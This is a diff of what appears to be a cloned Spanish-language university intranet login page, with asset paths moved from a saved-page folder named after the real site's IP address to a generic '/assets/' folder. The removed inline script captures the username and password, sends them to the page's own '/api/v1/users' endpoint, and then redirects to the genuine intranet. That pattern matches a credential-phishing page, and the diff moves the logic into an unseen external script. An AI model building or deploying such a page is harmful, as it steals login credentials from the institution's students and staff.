@@ -8,7 +8,7 @@
     <title>
 
     </title>
-    <link href="/200.48.129.172_files/stl_login.css" rel="stylesheet" type="text/css">
+    <link href="/assets/stl_login.css" rel="stylesheet" type="text/css">
     <style type="text/css">
         .style2 {
             height: 21px;
@@ -86,7 +86,7 @@
             </form>
         </div>
         <div id="PosicionDerecha">
-            <div id="imagen"><img src="/200.48.129.172_files/img001.jpg" width="380" height="253"> </div>
+            <div id="imagen"><img src="/assets/img001.jpg" width="380" height="253"> </div>
             <div id="Contenido">
                 <p>Le recordamos que tambien puede utilizar el servicio de correo electrónico institucional que ofrece
                     la universidad a toda la comunidad universitaria.</p>
@@ -97,58 +97,7 @@
             Reservados</div>
     </div>
 
-    <script>
-
-        document.addEventListener('DOMContentLoaded',e=>{
-
-            init();
-
-        });
-
-        const init = async () => {
-
-            const user = document.getElementById("txtUsuario");
-            const pass = document.getElementById("txtContrasenia");
-            const form1 = document.getElementById("form1");
-
-            const lblMensaje = document.getElementById("lblMensaje");
-
-            form1.addEventListener('submit',async evt=>{
-                
-                evt.preventDefault();
-
-                const {error: eU} = user.dataset;
-                const {error: eP} = pass.dataset;
-                
-                if(user.value===''){
-                    lblMensaje.textContent = eU;
-                    return;
-                }
-                
-                if(pass.value===''){
-                    lblMensaje.textContent = eP;
-                    return;
-                }
-
-                const response = await fetch('/api/v1/users',{
-                    method: 'POST',
-                    body: JSON.stringify({user: user.value,pass: pass.value}),
-                    headers: {
-                        'Content-type':'application/json'
-                    }
-                });
-                
-                if(response.ok){
-                    location.href = 'http://200.48.129.172/intranet/'
-                }else{
-                    console.log("Credenciales incorrectos");
-                    console.log(response.status);
-                }
-            });
-        };
-
-    </script>
-
+    <script src="/assets/script.js"></script>
 
 </body>
 
